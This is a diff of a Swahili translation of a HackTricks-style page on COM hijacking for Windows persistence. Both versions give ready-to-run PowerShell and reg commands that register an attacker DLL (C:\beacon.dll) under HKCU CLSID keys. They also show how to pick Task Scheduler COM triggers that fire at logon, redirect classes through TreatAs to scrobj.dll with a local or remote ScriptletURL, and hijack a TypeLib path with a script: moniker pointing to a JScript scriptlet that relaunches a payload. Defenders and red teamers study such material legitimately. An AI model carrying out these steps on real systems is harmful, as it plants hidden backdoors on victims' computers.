@@ -2,30 +2,30 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### Kutafuta vipengele vya COM visivyopo
+### Kutafuta COM components zisizopo
 
-Kwa kuwa thamani za HKCU zinaweza kubadilishwa na watumiaji, **COM Hijacking** inaweza kutumika kama **persistence mechanism**. Kutumia `procmon` ni rahisi kupata rejista za COM zinazotafutwa ambazo bado hazipo na zinaweza kuundwa na mshambuliaji. Vichujio vya kawaida:
+Kwa kuwa thamani za HKCU zinaweza kurekebishwa na users, **COM Hijacking** inaweza kutumika kama **persistence mechanism**. Kwa kutumia `procmon`, ni rahisi kupata registry za COM zinazotafutwa lakini bado hazipo na zinaweza kuundwa na attacker. Filters za kawaida:
 
-- **RegOpenKey** operations.
+- Operesheni za **RegOpenKey**.
 - ambapo _Result_ ni **NAME NOT FOUND**.
-- na _Path_ inamalizika na **InprocServer32**.
+- na _Path_ inaishia na **InprocServer32**.
 
-Mabadiliko muhimu wakati wa utafutaji:
+Variations muhimu wakati wa hunting:
 
-- Pia tazama funguo za **`LocalServer32`** zinazokosekana. Baadhi ya madarasa ya COM ni out-of-process servers na zitaleta EXE inayodhibitiwa na mshambuliaji badala ya DLL.
-- Tafuta **`TreatAs`** na **`ScriptletURL`** operesheni za rejista pamoja na `InprocServer32`. Yaliyomo ya utambuzi ya hivi karibuni na uandishi wa malware bado yanayomtaja haya kwa sababu ni nadra zaidi kuliko usajili wa COM wa kawaida na kwa hivyo ni high-signal.
-- Nakili halali **`ThreadingModel`** kutoka toleo la asili `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` wakati unakilisha usajili kwenda HKCU. Kutumia modeli isiyo sahihi mara nyingi huvunja activation na kufanya hijack iwe noisy.
-- Kwenye mifumo ya 64-bit angalia mtazamo wa 64-bit na 32-bit (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` na `HKLM\Software\Classes\WOW6432Node`) kwa sababu programu za 32-bit zinaweza kutatua usajili tofauti wa COM.
+- Pia tafuta keys za **`LocalServer32`** ambazo hazipo. Baadhi ya COM classes ni out-of-process servers na zitazindua EXE inayodhibitiwa na attacker badala ya DLL.
+- Tafuta operesheni za registry za **`TreatAs`** na **`ScriptletURL`**, pamoja na `InprocServer32`. Detection content ya hivi karibuni na malware writeups zinaendelea kuvitaja kwa sababu ni nadra zaidi kuliko COM registrations za kawaida, hivyo huwa na signal ya juu.
+- Nakili **`ThreadingModel`** halali kutoka kwenye `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` unapoclone registration kwenye HKCU. Kutumia model isiyo sahihi mara nyingi huvuruga activation na kufanya hijack ionekane wazi.<sup>[[3]](#references)</sup>
+- Kwenye systems za 64-bit, kagua views zote mbili za 64-bit na 32-bit (`procmon.exe` dhidi ya `procmon64.exe`, `HKLM\Software\Classes` na `HKLM\Software\Classes\WOW6432Node`) kwa sababu applications za 32-bit zinaweza kutatua COM registration tofauti.
 
-Mara ukiamua ni COM gani isiyo ya kweli kuiga, tekeleza amri zifuatazo. _Kuwa mwangalifu endapo utaamua kuiga COM inayopakiwa kila sekunde chache kwani inaweza kuwa kupita kiasi._
+Baada ya kuamua ni COM ipi isiyopo utakayo impersonate, tekeleza commands zifuatazo. _Kuwa mwangalifu ukiamua kuimpersonate COM inayoload kila baada ya sekunde chache, kwa sababu hilo linaweza kuwa kupita kiasi._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
-### Hijackable Task Scheduler COM components
+### COM components za Task Scheduler zinazoweza kutekwa
 
-Windows Tasks hutumia Custom Triggers kuitisha COM objects, na kwa sababu zinatekelezwa kupitia Task Scheduler, ni rahisi kubashiri lini zitatumika.
+Windows Tasks hutumia Custom Triggers kuita COM objects na kwa kuwa zinatekelezwa kupitia Task Scheduler, ni rahisi zaidi kutabiri wakati zitakapoanzishwa.
 
 <pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
 $Tasks = Get-ScheduledTask
@@ -56,9 +56,9 @@ Write-Host
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
 # [more like the previous one...]</code></pre>
 
-Ukikagua matokeo unaweza kuchagua ile ambayo itatekelezwa **kila wakati mtumiaji anapoingia**, kwa mfano.
+Ukikagua matokeo, unaweza kuchagua moja ambayo itatekelezwa **kila wakati mtumiaji anapoingia** kwa mfano.
 
-Sasa, ukitafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na katika HKLM na HKCU, kawaida utagundua kwamba thamani haipo katika HKCU.
+Sasa ukitafuta CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** katika **HKEY\CLASSES\ROOT\CLSID** na kwenye HKLM na HKCU, kwa kawaida utagundua kuwa thamani hiyo haipo kwenye HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -79,21 +79,21 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-Then, unaweza kuunda tu entry ya HKCU na kila mara mtumiaji anapoingia, backdoor yako itatekelezwa.
+Then, unaweza tu kuunda entry ya HKCU na kila wakati user anapoingia, backdoor yako itatekelezwa.
 
 ---
 
 ## COM TreatAs Hijacking + ScriptletURL
 
-`TreatAs` inaruhusu CLSID moja kuigizwa na nyingine. Kwa mtazamo wa mashambulizi hili linamaanisha unaweza kuacha CLSID ya asili bila kuifanyia mabadiliko, kuunda CLSID ya pili kwa kila mtumiaji inayorejea `scrobj.dll`, na kisha kuelekeza COM object halisi kwa ile yenye madhara kwa kutumia `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.
+`TreatAs` huruhusu CLSID moja kuigwa na nyingine.<sup>[[4]](#references)</sup> Kwa mtazamo wa offensive, hii inamaanisha unaweza kuacha CLSID ya awali bila kuigusa, kuunda CLSID ya pili ya per-user inayoelekeza kwenye `scrobj.dll`, kisha kuelekeza COM object halisi kwenye ile yenye malicious kupitia `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.
 
 Hii ni muhimu wakati:
 
-- target application tayari huunda CLSID thabiti wakati wa kuingia au kuanzishwa kwa app
-- unataka redirect ya registry tu badala ya kubadilisha `InprocServer32` ya asili
-- unataka kutekeleza scriptlet ya `.sct` ya ndani au ya mbali kupitia thamani ya `ScriptletURL`
+- target application tayari inaunda CLSID thabiti wakati wa logon au app start
+- unataka redirect ya registry-only badala ya kubadilisha `InprocServer32` ya awali
+- unataka kutekeleza scriptlet ya ndani au ya remote `.sct` kupitia value ya `ScriptletURL`
 
-Mfano wa mtiririko wa kazi (imebadilishwa kutoka Atomic Red Team tradecraft ya umma na utafiti wa zamani wa COM registry abuse):
+Mfano wa workflow (uliorekebishwa kutoka public Atomic Red Team tradecraft na utafiti wa zamani kuhusu COM registry abuse):
 ```cmd
 :: 1. Create a malicious per-user COM class backed by scrobj.dll
 reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
@@ -108,32 +108,32 @@ reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\Trea
 ```
 Notes:
 
-- `scrobj.dll` husoma thamani ya `ScriptletURL` na kutekeleza `.sct` inayorejelewa, kwa hivyo unaweza kuweka payload kama faili ya ndani au kuipakua kwa mbali kupitia HTTP/HTTPS.
-- `TreatAs` ni muhimu hasa wakati usajili wa awali wa COM umekamilika na ni thabiti katika HKLM, kwa sababu unahitaji tu mabadiliko madogo ya mtumiaji badala ya kuiga mti mzima.
-- Kwa uhakiki bila kusubiri trigger ya asili, unaweza kuanzisha ProgID/CLSID bandia kwa mikono kwa kutumia `rundll32.exe -sta <ProgID-or-CLSID>` ikiwa darasa la lengo linaunga mkono STA activation.
+- `scrobj.dll` husoma thamani ya `ScriptletURL` na kutekeleza `.sct` iliyorejelewa, kwa hivyo unaweza kuhifadhi payload kama faili la ndani au kuipakua kwa mbali kupitia HTTP/HTTPS.
+- `TreatAs` ni muhimu hasa wakati usajili wa awali wa COM umekamilika na ni thabiti katika HKLM, kwa sababu unahitaji tu redirect ndogo ya kila mtumiaji badala ya kuiga tree nzima.
+- Kwa validation bila kusubiri trigger ya kawaida, unaweza kuanzisha fake ProgID/CLSID mwenyewe kwa `rundll32.exe -sta <ProgID-or-CLSID>` ikiwa target class inaunga mkono STA activation.
 
 ## COM TypeLib Hijacking (script: moniker persistence)
 
-Type Libraries (TypeLib) hufafanua interfaces za COM na hupakiwa kupitia `LoadTypeLib()`. Wakati COM server inapoanzishwa, OS inaweza pia kupakia TypeLib inayohusiana kwa kushauriana na vyeo vya registry chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib itabadilishwa na **moniker**, mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet wakati TypeLib itakapokataliwa – kutoa persistence ya kimyakimya inayochocheka wakati vipengele vya kawaida vinapoguswa.
+Type Libraries (TypeLib) hufafanua COM interfaces na hupakiwa kupitia `LoadTypeLib()`. COM server inapokuwa instantiated, OS inaweza pia kupakia TypeLib inayohusishwa nayo kwa kushauriana na registry keys zilizo chini ya `HKCR\TypeLib\{LIBID}`. Ikiwa njia ya TypeLib itabadilishwa kuwa **moniker**, kwa mfano `script:C:\...\evil.sct`, Windows itatekeleza scriptlet wakati TypeLib inapotatuliwa – hivyo kutoa persistence iliyofichika ambayo hu-trigger wakati components za kawaida zinapotumiwa.
 
-Hii imeonekana dhidi ya Microsoft Web Browser control (inapakiwa mara nyingi na Internet Explorer, apps zinazoembed WebBrowser, na hata `explorer.exe`).
+Hili limeonekana likitumiwa dhidi ya Microsoft Web Browser control (ambayo hupakiwa mara kwa mara na Internet Explorer, apps zinazopachika WebBrowser, na hata `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Steps (PowerShell)
 
-1) Tambua TypeLib (LIBID) inayotumika na CLSID yenye shughuli nyingi. Mfano wa CLSID unaotumiwa mara kwa mara na malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
+1) Tambua TypeLib (LIBID) inayotumiwa na CLSID yenye frequency kubwa. Mfano wa CLSID unaotumiwa mara kwa mara na malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
 ```powershell
 $clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
 $libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
 $ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
 "CLSID=$clsid  LIBID=$libid  VER=$ver"
 ```
-2) Elekeza njia ya TypeLib ya mtumiaji kwa scriptlet ya ndani ukitumia moniker ya `script:` (hakuna ruhusa za admin zinazohitajika):
+2) Elekeza njia ya TypeLib ya kila mtumiaji kwenye scriptlet ya ndani kwa kutumia moniker ya `script:` (hakuna haki za admin zinazohitajika):
 ```powershell
 $dest = 'C:\\ProgramData\\Udate_Srv.sct'
 New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
 Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
 ```
-3) Weka `.sct` ndogo ya JScript ambayo inaanzisha tena payload yako kuu (kwa mfano `.lnk` inayotumiwa na initial chain):
+3) Weka JScript `.sct` ndogo inayozindua upya payload yako kuu (k.m. `.lnk` inayotumiwa na chain ya mwanzo):
 ```xml
 <?xml version="1.0"?>
 <scriptlet>
@@ -150,24 +150,24 @@ sh.Run(cmd, 0, false);
 </script>
 </scriptlet>
 ```
-4) Kuchochea – kufungua IE, programu inayojumuisha WebBrowser control, au hata shughuli za kawaida za Explorer itapakia TypeLib na kutekeleza scriptlet, kuwasha tena mnyororo wako wakati wa logon/reboot.
+4) Triggering – kufungua IE, application inayopachika WebBrowser control, au shughuli za kawaida za Explorer kutapakia TypeLib na kutekeleza scriptlet, hivyo kuandaa upya chain yako wakati wa logon/reboot.
 
-Usafishaji
+Cleanup
 ```powershell
 # Remove the per-user TypeLib hijack
 Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
 # Delete the dropped scriptlet
 Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
 ```
-Vidokezo
-- Unaweza kutumia mantiki sawa kwa vipengele vingine vya COM vinavyotumika mara kwa mara; daima tambua `LIBID` halisi kutoka `HKCR\CLSID\{CLSID}\TypeLib` kwanza.
-- Kwenye mifumo ya 64-bit unaweza pia kujaza subkey ya `win64` kwa watumiaji wa 64-bit.
+Maelezo
+- Unaweza kutumia mantiki hiyo hiyo kwa vipengele vingine vya COM vinavyotumika mara kwa mara; kila mara pata `LIBID` halisi kwanza kutoka `HKCR\CLSID\{CLSID}\TypeLib`.
+- Kwenye mifumo ya 64-bit unaweza pia kujaza subkey ya `win64` kwa consumers wa 64-bit.
 
 ## Marejeo
 
-- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
-- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
-- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
+- [1] [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [2] [Check Point Research – Kampeni ya ZipLine: Shambulio la Kisasa la Phishing Linalolenga Kampuni za Marekani](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
+- [3] [Kukagua Upya COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
+- [4] [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
 
 {{#include ../../banners/hacktricks-training.md}}
